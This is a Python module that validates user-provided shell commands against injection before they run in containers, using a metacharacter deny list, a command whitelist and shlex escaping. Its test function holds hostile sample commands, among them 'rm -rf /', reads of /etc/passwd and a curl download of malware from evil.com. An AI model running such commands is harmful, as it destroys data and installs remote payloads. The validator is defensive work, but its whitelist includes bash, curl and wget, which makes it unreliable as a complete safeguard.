"""Command Security for VibeCode

This module provides security functions to prevent command injection attacks
when executing user-provided commands in containers.
"""

import re
import shlex
import logging
from typing import List, Optional

logger = logging.getLogger(__name__)


# ─── Dangerous Pattern Detection ───────────────────────────────────────────────

# Patterns that indicate potential command injection
DANGEROUS_PATTERNS = [
    r';',           # Command separator
    r'&&',          # AND operator
    r'\|\|',        # OR operator
    r'\|',          # Pipe
    r'`',           # Command substitution (backticks)
    r'\$\(',        # Command substitution $(...)
    r'\$\{',        # Variable expansion with potential command substitution
    r'>',           # Output redirection
    r'<',           # Input redirection
    r'&',           # Background execution
    r'\n',          # Newline (multi-command)
    r'\r',          # Carriage return
]

# Compile patterns for efficiency
DANGEROUS_REGEX = re.compile('|'.join(DANGEROUS_PATTERNS))


# Whitelist of safe commands (for strict mode)
SAFE_COMMANDS = {
    # File operations
    'ls', 'cat', 'head', 'tail', 'grep', 'find', 'wc', 'sort', 'uniq',
    
    # Programming languages
    'python', 'python3', 'node', 'npm', 'pip', 'pip3',
    
    # Build tools
    'make', 'cmake', 'gcc', 'g++',
    
    # Version control
    'git',
    
    # Text editors
    'vim', 'nano', 'emacs',
    
    # Shell utilities
    'echo', 'pwd', 'cd', 'mkdir', 'touch', 'cp', 'mv', 'rm',
    
    # Package managers
    'apt', 'apt-get', 'yum', 'dnf', 'brew',
    
    # Other
    'bash', 'sh', 'curl', 'wget', 'tar', 'gzip', 'unzip',
}


# ─── Command Sanitization Functions ────────────────────────────────────────────

def contains_dangerous_patterns(command: str) -> bool:
    """Check if command contains dangerous patterns
    
    Args:
        command: Command string to check
        
    Returns:
        True if dangerous patterns found, False otherwise
    """
    return bool(DANGEROUS_REGEX.search(command))


def get_dangerous_patterns(command: str) -> List[str]:
    """Get list of dangerous patterns found in command
    
    Args:
        command: Command string to check
        
    Returns:
        List of dangerous patterns found
    """
    patterns = []
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, command):
            patterns.append(pattern.replace('\\', ''))
    return patterns


def is_safe_command(command: str, strict: bool = False) -> bool:
    """Check if command is safe to execute
    
    Args:
        command: Command string to check
        strict: If True, only allow whitelisted commands
        
    Returns:
        True if command is safe, False otherwise
    """
    # Check for dangerous patterns
    if contains_dangerous_patterns(command):
        return False
    
    # In strict mode, check against whitelist
    if strict:
        try:
            parts = shlex.split(command)
            if not parts:
                return False
            
            base_command = parts[0].split('/')[-1]  # Get command name without path
            return base_command in SAFE_COMMANDS
        except ValueError:
            # shlex.split failed (malformed command)
            return False
    
    return True


def sanitize_command(command: str, allow_pipes: bool = False) -> str:
    """Sanitize command by escaping dangerous characters
    
    This function uses shlex to properly escape shell metacharacters.
    
    Args:
        command: Command to sanitize
        allow_pipes: If True, allow pipe characters (for advanced users)
        
    Returns:
        Sanitized command string
        
    Raises:
        ValueError: If command contains dangerous patterns
    """
    # Check for null bytes
    if '\x00' in command:
        raise ValueError("Command contains null byte")
    
    # Check for dangerous patterns
    dangerous = get_dangerous_patterns(command)
    if dangerous:
        if not allow_pipes or any(p not in ['|'] for p in dangerous):
            raise ValueError(
                f"Command contains dangerous patterns: {', '.join(dangerous)}"
            )
    
    # Use shlex to properly quote the command
    try:
        # Split and rejoin to ensure proper escaping
        parts = shlex.split(command)
        if not parts:
            raise ValueError("Empty command")
        
        # Rejoin with proper escaping
        return shlex.join(parts)
    except ValueError as e:
        raise ValueError(f"Malformed command: {e}")


def execute_safe_command(
    command: str,
    strict: bool = False,
    allow_pipes: bool = False
) -> str:
    """Validate and sanitize command for safe execution
    
    This is the main function to use before executing user commands.
    It performs multiple security checks and returns a safe command.
    
    Args:
        command: User-provided command
        strict: If True, only allow whitelisted commands
        allow_pipes: If True, allow pipe characters
        
    Returns:
        Sanitized command safe for execution
        
    Raises:
        ValueError: If command is unsafe
        
    Example:
        >>> safe_cmd = execute_safe_command("echo hello")
        >>> # Execute safe_cmd in container
    """
    if not command or not command.strip():
        raise ValueError("Command cannot be empty")
    
    command = command.strip()
    
    # Log the command for audit
    logger.info(f"Validating command: {command[:100]}")
    
    # Check length
    if len(command) > 10000:
        raise ValueError("Command too long (max 10000 characters)")
    
    # Check for null bytes
    if '\x00' in command:
        raise ValueError("Command contains null byte")
    
    # Check if command is safe
    if not is_safe_command(command, strict=strict):
        dangerous = get_dangerous_patterns(command)
        
        if strict:
            # In strict mode, check whitelist
            try:
                parts = shlex.split(command)
                base_command = parts[0].split('/')[-1]
                if base_command not in SAFE_COMMANDS:
                    raise ValueError(
                        f"Command '{base_command}' not in whitelist. "
                        f"Allowed commands: {', '.join(sorted(SAFE_COMMANDS))}"
                    )
            except ValueError:
                pass
        
        if dangerous:
            raise ValueError(
                f"Command contains dangerous patterns: {', '.join(dangerous)}. "
                f"These patterns can be used for command injection attacks."
            )
    
    # Sanitize the command
    try:
        sanitized = sanitize_command(command, allow_pipes=allow_pipes)
        logger.info(f"Command validated successfully")
        return sanitized
    except ValueError as e:
        logger.warning(f"Command validation failed: {e}")
        raise


# ─── Argument Sanitization ─────────────────────────────────────────────────────

def sanitize_arguments(args: List[str]) -> List[str]:
    """Sanitize command arguments
    
    Args:
        args: List of command arguments
        
    Returns:
        List of sanitized arguments
        
    Raises:
        ValueError: If any argument is unsafe
    """
    sanitized = []
    
    for arg in args:
        # Check for null bytes
        if '\x00' in arg:
            raise ValueError(f"Argument contains null byte: {arg}")
        
        # Check for dangerous patterns
        if contains_dangerous_patterns(arg):
            dangerous = get_dangerous_patterns(arg)
            raise ValueError(
                f"Argument contains dangerous patterns: {', '.join(dangerous)}"
            )
        
        # Use shlex to properly quote
        sanitized.append(shlex.quote(arg))
    
    return sanitized


def build_safe_command(base_command: str, args: List[str]) -> str:
    """Build a safe command from base command and arguments
    
    This function ensures both the base command and arguments are safe,
    then combines them into a properly escaped command string.
    
    Args:
        base_command: Base command (e.g., "python", "node")
        args: List of arguments
        
    Returns:
        Safe command string
        
    Raises:
        ValueError: If command or arguments are unsafe
        
    Example:
        >>> cmd = build_safe_command("python", ["script.py", "--verbose"])
        >>> # cmd = "python script.py --verbose"
    """
    # Validate base command
    if not base_command or not base_command.strip():
        raise ValueError("Base command cannot be empty")
    
    base_command = base_command.strip()
    
    # Check base command for dangerous patterns
    if contains_dangerous_patterns(base_command):
        raise ValueError("Base command contains dangerous patterns")
    
    # Sanitize arguments
    safe_args = sanitize_arguments(args) if args else []
    
    # Build command
    if safe_args:
        return f"{base_command} {' '.join(safe_args)}"
    else:
        return base_command


# ─── Testing Function ──────────────────────────────────────────────────────────

def test_command_security():
    """Test command security functions"""
    print("Testing command security...")
    
    # Test safe commands
    safe_commands = [
        "echo hello",
        "python test.py",
        "ls -la",
        "npm install",
    ]
    
    print("\n✅ Safe commands:")
    for cmd in safe_commands:
        try:
            result = execute_safe_command(cmd)
            print(f"   '{cmd}' → '{result}'")
        except ValueError as e:
            print(f"   ❌ FAILED: '{cmd}' - {e}")
    
    # Test dangerous commands
    dangerous_commands = [
        "rm -rf / ; echo hacked",
        "cat /etc/passwd && echo done",
        "ls | grep test",
        "echo `whoami`",
        "echo $(cat /etc/passwd)",
        "curl http://evil.com > /tmp/malware && chmod +x /tmp/malware",
    ]
    
    print("\n🚫 Dangerous commands (should be blocked):")
    for cmd in dangerous_commands:
        try:
            execute_safe_command(cmd)
            print(f"   ❌ FAILED: '{cmd}' was allowed")
        except ValueError as e:
            print(f"   ✅ Blocked: '{cmd}' - {str(e)[:60]}")
    
    print("\nCommand security tests complete!")


if __name__ == "__main__":
    test_command_security()
